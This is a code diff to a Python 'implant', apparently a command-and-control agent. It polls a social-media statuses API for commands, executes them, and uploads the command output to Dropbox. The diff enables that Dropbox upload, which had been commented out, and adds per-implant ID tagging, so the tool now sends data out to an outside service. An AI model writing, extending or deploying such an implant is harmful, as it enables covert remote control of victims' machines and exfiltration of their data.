@@ -1,3 +1,6 @@
+#!/usr/bin/python3
+
+import sys
 import toml
 import requests
 import json
@@ -11,8 +14,8 @@ def get_config():
     # Print status
     print("[*] Getting configuration settings from config file")
 
-    # Define the server, user_id and dropbox_token as a global variable
-    global server, user_id, dropbox_token
+    # Define the server, user_id, impID and dropbox_token as a global variable
+    global server, user_id, dropbox_token, impID
 
     # Load the config file
     config = toml.load("config.toml")
@@ -25,6 +28,18 @@ def get_config():
 
     # Get dropbox token from the config file
     dropbox_token = config["dropbox_token"]
+
+    # impID is an argument passed to the implant, if it's not passed, generate a random one
+    if len(sys.argv) > 1:
+        impID = sys.argv[1]
+    else:
+        print("[*] No implant ID passed, generating random one...")
+        
+        # Generate a random implant ID
+        impID = "00000001"
+        # impID = base64.b64encode(os.urandom(8)).decode("utf-8")
+
+        print("[*] Implant ID: " + impID)
 
 def get_latest_command():
     api_endpoint = f'/api/v1/accounts/{user_id}/statuses'
@@ -86,20 +101,23 @@ def upload_output(output):
     # Print status
     print("[*] Uploading output to dropbox...")
 
-    # Upload the output
-    dbx = dropbox.Dropbox(dropbox_token)
+    try:
+        # Upload the output
+        dbx = dropbox.Dropbox(dropbox_token)
 
-    # Encode the output
-    output = output.encode("utf-8")
+        # Encode the output
+        output = output.encode("utf-8")
 
-    # Set the output file name as the current time in the format ddmmYYYYHHMMSS
-    output_file_name = time.strftime("%d%m%Y%H%M%S")
+        # Upload the output to dropbox, if the file already exists, overwrite it
+        dbx.files_upload(output, f"/output/{impID}_output.txt", mode=dropbox.files.WriteMode.overwrite)
 
-    # Upload the output
-    dbx.files_upload(output, "/output/" + output_file_name + ".txt")
+        # Print status
+        print("[*] Output uploaded")
 
-    # Print status
-    print("[*] Output uploaded")
+    except:
+        # Print status
+        print("[*] Couldn't upload output to dropbox")
+        exit()
 
 def listen():
     # Print status
@@ -132,8 +150,7 @@ def listen():
             output = execute_command(latest_command)
 
             # Upload the output
-            #upload_output(output)
-            print("OUTPUT: ", output)
+            upload_output(output)
 
             # Set the command to the latest command
             command = latest_command
